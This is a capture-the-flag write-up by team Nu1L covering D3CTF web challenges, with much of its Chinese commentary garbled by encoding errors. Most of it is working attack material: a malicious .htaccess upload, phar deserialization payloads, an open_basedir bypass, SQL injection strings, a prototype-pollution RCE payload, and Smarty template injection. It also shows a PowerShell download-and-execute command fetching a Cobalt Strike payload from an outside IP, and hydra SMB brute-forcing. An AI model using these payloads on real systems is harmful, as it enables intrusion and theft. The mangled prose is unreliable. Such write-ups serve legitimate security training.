D3CTF Writeup
1
D3CTF Writeup
Author:Nu1L
Web
ezupload
å…ˆå†™htaccessè®©ä»–å¯ä»¥æ‰§â¾è„šæœ¬
POST / HTTP/1.1 
Content-Type: multipart/form-data; boundary=--------------------------030808716877952631606047 
User-Agent: PostmanRuntime/7.20.1 
Accept: */* 
Cache-Control: no-cache 
Postman-Token: aeee478c-f649-433f-b007-6799bb3db9f2 
Host: cdc673a649.ezupload.d3ctf.io 
Accept-Encoding: gzip, deflate 
Content-Length: 443 
Connection: close 
----------------------------030808716877952631606047 
Content-Disposition: form-data; name="action" 
upload 
----------------------------030808716877952631606047 
Content-Disposition: form-data; name="url" 
data:image/png;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0 
----------------------------030808716877952631606047 
Content-Disposition: form-data; name="filename" 
.htaccess 
----------------------------030808716877952631606047--
å†ååºåˆ—åŒ–å¾€â½‚ä»¶â¾¥å†™jioæœ¬
å…ˆæ‰¾â½¬å½•
userdir = '../'; 
$d2 = new dir("url", "filename"); 
$d2->filename = "upload/3535fc06ad2b768f8f2f752376f94f14/test3"; 
$d2->userdir = $d1; 
// echo serialize($d2); 
$phar = new Phar("1.phar"); 
$phar->startBuffering(); 
$phar->setStub("GIF89a"." __HALT_COMPILER(); ");  
// å¢åŠ gifâ½‚ä»¶å¤´ 
$phar->setMetadata($d2); 
Web
ezupload
ezts
easyweb
fake onelinephp
Showhub
Pwn
knote
unprintableV
new_heap
RE
Ancient Game V2
Crypto
babyecc
sign2win
D3CTF Writeup
2
$phar->addFromString("test.jpg","test"); 
$phar->stopBuffering();
è¿™â¾¥ä¸ºäº†ç»•è¿‡å†…å®¹æ£€æµ‹, æŠŠpharå‹ç¼©(â½¤gzip)äº†â¼€ä¸‹
è§¦å‘
ç„¶åå†å†™ä¸ªè„šæœ¬, å†™txt, æ”¾webshell,  è¿˜æ˜¯ä¸ºäº†ç»•è¿‡æ£€æµ‹, å‹ç¼©äº†â¼€ä¸‹
userdir = 'filename = '/var/www/html/a57ecd54d4df7d99/upload/3535fc06ad2b768f8f2f752376f94f14/test3'; 
$phar = new Phar("2.phar"); 
$phar->startBuffering(); 
$phar->setStub("GIF89a"." __HALT_COMPILER(); ");  
D3CTF Writeup
3
// å¢åŠ gifâ½‚ä»¶å¤´ 
$phar->setMetadata($d3); 
$phar->addFromString("test.jpg","test"); 
$phar->stopBuffering();
phpinfo å‘ç° open_basedir=/var/www/html
ç»•è¿‡+æŸ¥çœ‹ = get flag
ini_set('open_basedir', '..'); 
chdir('..'); 
chdir('..'); 
chdir('..'); 
chdir('..'); 
chdir('..'); 
D3CTF Writeup
4
chdir('..'); 
ini_set('open_basedir', '/'); 
var_dump(scandir('/')); 
echo file_get_contents('F1aG_1s_H4r4'); 
// d3ctf{C0n9rAtul4t1ons_Y0u_9ot_1t}
åˆ›æ–°ç‚¹:
htaccessçš„addhandler ä¸â½Œapplication/x-httpd-php
ezts
KOAæ¡†æ¶https://github.com/koajs/koa
https://github.com/d-band/koa-orm
æ‰¾åˆ°æ˜¯è¿™ä¸ªåº“, ç„¶åå»åšæ³¨â¼Š.
http://df8aea7e00.ezts.d3ctf.io/search?key=1'BB%20or%20AA%271&value=1 
http://df8aea7e00.ezts.d3ctf.io/search?key=1'BB%20or%201%23&value=1
http://df8aea7e00.ezts.d3ctf.io/search?key=1'BB%20or%20(ascii(substr((select%20version()),1,1BB%3E10B%23&value=1
å†™è„šæœ¬è·‘å‡º
admin 47ada0f1c8e3d8c3
åŸå‹é“¾æ±¡æŸ“
åå°ç™»ä¸Šå», éšä¾¿ç»™é‚£ä¸ªâ½¤â¼¾è®¾ç½®ä¸ªdata
{"constructor":{"prototype":{"outputFunctionName":"a; return global.process.mainModule.constructor._load('child_process').execS
/flag  æ˜¯root 400æƒé™, ç°åœ¨æ˜¯nodeâ½¤â¼¾, éœ€è¦æå–
D3CTF Writeup
5
Linux 8c6231193dc6 4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019 x86_64 GNU/Linux 
$ lsb_release -a 
No LSB modules are available. 
Distributor ID: Debian 
Description:    Debian GNU/Linux 9.11 (stretch) 
Release:        9.11 
Codename:       stretch 
$ gcc --version 
gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516 
$ ldd --version 
ldd (Debian GLIBC 2.24-11+deb9u4) 2.24
CVEZ2019Z14287
easyweb
admin admin
Hi, admin, hope you have a good experience in this ctf gameyou must get a RCE Bug in this challenge
â½‚æ¡£ï¼šhttps://codeigniter.org.cn/user_guide/general/controllers.html
// controllers/user.php 
public function index() 
 { 
  if ($this->session->has_userdata('userId')) { 
   $userView = $this->Render_model->get_view($this->session->userId); 
   $prouserView = 'data:,' . $userView; 
   $this->username = array('username' => $this->getUsername($this->session->userId)); 
   $this->ci_smarty->assign('username', $this->username); 
   $this->ci_smarty->display($prouserView); 
  } else { 
   redirect('/user/login'); 
  } 
 } 
// models/render_model.php 
public function get_view($userId){ 
  $res = $this->db->query("SELECT username FROM userTable WHERE userId='$userId'")->result(); 
  if($res){ 
   $username = $res[0]->username; 
   $username = $this->sql_safe($username); 
   $username = $this->safe_render($username); 
   $userView = $this->db->query("SELECT userView FROM userRender WHERE username='$username'")->result(); 
   $userView = $userView[0]->userView; 
   return $userView; 
  }else{ 
   return false; 
  } 
 } 
 private function safe_render($username){ 
D3CTF Writeup
6
  $username = str_replace(array('{','}'),'',$username); 
  return $username; 
 } 
private function sql_safe($sql){ 
  if(preg_match('/and|or|order|delete|select|union|load_file|updatexml|\(|extractvalue|\)/i',$sql)){ 
   return ''; 
  }else{ 
   return $sql; 
  } 
 } 
åœ¨sql payloadâ¾¥â¾¯åŠ ä¸Š{ } ç»•è¿‡sql_safe ç„¶åæ¸²æŸ“æ¨¡æ¿.. 
testuser123' uni{on sel{ect 06c616c616c61 limit 1,1 -- -
public function index() 
 { 
  if ($this->session->has_userdata('userId')) { 
   $userView = $this->Render_model->get_view($this->session->userId); 
   $prouserView = 'data:,' . $userView; 
   $this->username = array('username' => $this->getUsername($this->session->userId)); 
   $this->ci_smarty->assign('username', $this->username); 
   $this->ci_smarty->display($prouserView); 
  } else { 
   redirect('/user/login'); 
  } 
 } 
https://www.smarty.net/docs/zh_CN/index.tpl
select hex('EE$smarty.version}}')
123' unio{n se{lect 07B7B24736D617274792E76657273696F6E7D7D limit 1,1 â€”
è¿˜è¦é€ƒé€¸æ²™ç®±
å‡½æ•°â½©åå•ï¼š
public $php_functions = array('isset', 'empty', 'count', 'sizeof', 'in_array', 'is_array', 'time',);
ä¼°è®¡è¦â½¤å†…ç½®â½…æ³•Orz
D3CTF Writeup
7
D3CTF Writeup
8
123' unio{n se{lect 
07B7B7068707D7D696E636C75646528272F746D702F64643861656634666635656566383462356232363262653
 limit 1,1 â€”
ä½¿â½¤{php}æ ‡ç­¾â½‚ä»¶åŒ…å«ä¸Šä¼ çš„Webshellï¼Œå³å¯ç»•è¿‡æ²™ç®±ã€‚
â¾®é¢„æœŸ
d3ctf{Th4at's_A_Si11y_P0p_chi4n}
fake onelinephp
.gitæ³„æ¼ï¼Œæ‹–å‡ºæ¥æ˜¯ä¸¤ä¸ªâ½‚ä»¶ï¼š1. hint1.txt  2. index.php
hint1.txt:
GitHack? 
Naiiiive!
index.php:
å¯¹ä½†æ˜¯ï¼Œç°åœ¨è®¿é—®ä¸åˆ°=ã€‚= 404
åˆ·æ–°äº†ä¸‰æ¬¡ï¼Œâ¼€æ¬¡æ˜¯404ï¼Œâ¼€æ¬¡æ˜¯502ï¼Œâ¼€æ¬¡èƒ½æ­£å¸¸æ‰§â¾highlight_fileï¼Œæ‰€ä»¥æ˜¯å•¥featureå—ã€‚ 
å¯¹ã€‚ã€‚è¿™æ˜¯è¦â¼²å•¥ã€‚ã€‚ã€‚
ä¼°è®¡æ˜¯é˜²â½Œæ¡ä»¶ç«äº‰å§ï¼Œä¸è®©â½¤åŸè§£
D3CTF Writeup
9
è¿˜æœ‰å…¶ä»– .git 
dict.txt
10.23 ğŸŒ 
ğŸ‘´è®°å¿†â¼’ä¸å¥½ï¼Œæ‰€ä»¥ğŸ‘´æŠŠå¯†ç è—è¿™â¾¥çš„æŸâ¼€â¾ï¼ŒğŸ‘´åªéœ€è¦è®°ä½â¼€ä¸ªâ¾å·å°±å¯ä»¥äº†ï¼Œä½†æ˜¯ä½ ä¸â¾:) 
Still I can't remember my longlonglong password, 
so I created a dictionary to hide my password (you are looking right at it). 
Now a line number is all I need to remember to retrieve my password, while you can't =w= 
Nx9MEEAcWUt6PrS 
mB5cvz9U0lolxel 
8NrWdcUvbABVraV 
HEjSwTpsJZclu8M 
Cn0rQ7dxJuW3vBQ 
......
hint2.txt
10.24 ğŸŒ§ 
è¿™å°ğŸ’»è·‘ç€webæœåŠ¡ï¼Œä¸ºäº†é˜²â½Œâ¼¤â¿Šé˜”â½¤nginx 0dayâ¿Šæˆ‘ç”µè„‘æ‹¿flagï¼ŒğŸ‘´æŠŠflagæ”¾åˆ°äº†å†…â½¹çš„ğŸ’»ä¸Š(172.19.97.8 C:\Users\Administrator\Desktop\flag.txt 
è™½ç„¶ğŸ‘´è®°å¿†â¼’ä¸å¥½ï¼Œâ¼€ä¸ªå¯†ç â¾›å¤©ä¸‹ï¼Œéš¾é“ä½ ä»¬â¿Šé˜”è¿˜èƒ½ç›—æˆ‘å·ğŸŒ¶ï¼Ÿ 
In case you H4ck3rs use nginx 0day to pwn this computer, I put the flag on 
172.19.97.8 C:\Users\Administrator\Desktop\flag.txt 
I'm not good at remembering passwords, so all my passwords are the same. 
I doubt that you can ever find the password, so I'm all good, I think.
ç›´æ¥ä¸ŠCobalt Strikeï¼Œstageless payloadé€‰æ‹©powershellï¼Œå°†å…¶Host åˆ°C2ä¸Šï¼Œç„¶åâ½¤pshä¸‹è½½æ‰§â¾å³å¯ç»•è¿‡AVã€‚
system("powershell.exe -nop -w hidden -c \"IEX ((new-object 
net.webclient).downloadstring('http://47.95.251.134{8080/download/file.ps1'))\"");
ç„¶åæ‰“åŒ…ä¸Šä¼ Hydraï¼Œå°†Hintä¸­å¾—å¯†ç â½£æˆå­—å…¸ï¼Œå¯¹æœ¬åœ°SMBæœåŠ¡çˆ†ç ´
hydra -l w1nd-P pass.txt smb://172.19.97.4
D3CTF Writeup
10
çˆ†ç ´è·å¾—å¯†ç åå³å¯Make Tokenï¼Œæ‹¿ä¸‹ç¬¬â¼†å°æœºå™¨æƒé™ã€‚
make_token .\administrator eDHU27TlY6ugslV
shell type \\172.19.97.8\C$\Users\ADministrator\Desktop\flag.txt
D3CTF Writeup
11
d3ctf{Sh3ll_fr0m_ur1111_inc1ude!1!!!_soCoooool}
Showhub
Description
Showhub is a fashion-focused community built on a self-developed framework.Download this framework here
Notice:scanner is useless
Challenge Address
http://ec057b43d9.showhub.d3ctf.io
æ³¨å†Œæ—¶sqlè¯­å¥ä½¿â½¤sprintfæ‹¼æ¥ï¼Œå¯ä»¥åˆ©â½¤ %1$\'  æ ¼å¼åŒ–å‡ºâ¼€ä¸ªå•å¼•å·ï¼Œä»â½½å¯¼è‡´insertæ³¨â¼Š
D3CTF Writeup
12
smi1e12345%1$',%1$'4a451ff953e28b3ba4f366ab2147ce99e8a3254502f53bda1bc578dfece79c6c%1$')# 
smi1e12345 smi1esmi1e  ç™»é™†
smi1e123%1$',(if(1,sleep(3),1)))#  å¯ä»¥ç›²æ³¨ï¼Œä½†æ˜¯adminå¯†ç æ˜¯sha256åŠ å¯†çš„ æ³¨å‡ºæ¥å¹¶æ²¡æœ‰â½¤
æ‰€ä»¥åªèƒ½æƒ³åŠæ³•æ”¹æ‰adminå¯†ç ï¼Œè¿™â¾¥åˆ©â½¤ ON DUPLICATE KEY UPDATE  ,å½“insertå·²ç»å­˜åœ¨çš„è®°å½•æ—¶ï¼Œæ‰§â¾Update
â½¤ä¸‹â¾¯çš„å½“â½¤â¼¾å, å¯†ç éšä¾¿, æ³¨å†Œ
admin%1$',%1$'password%1$') ON DUPLICATE KEY UPDATE password=%1$'7e6e0c3079a08c5cc6036789b57e951f65f82383913ba1a49ae992544f1b4b